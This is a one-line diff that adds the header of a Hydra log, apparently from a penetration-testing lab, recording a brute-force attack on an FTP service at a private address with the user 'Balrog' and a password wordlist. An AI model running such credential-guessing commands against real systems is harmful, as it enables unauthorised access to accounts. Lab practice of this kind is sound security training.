@@ -1,0 +1,1 @@
+# Hydra v8.6 run at 2017-10-02 19:55:36 on 192.168.2.89 ftp (hydra -s 21 -o /tmp/sparta-_cFVUO-running/hydra/20171002195526-192.168.2.89-21-ftp.txt -l Balrog -P /root/Downloads/Moria/passwords.txt -e ns -u -f -V -t 16 192.168.2.89 ftp)
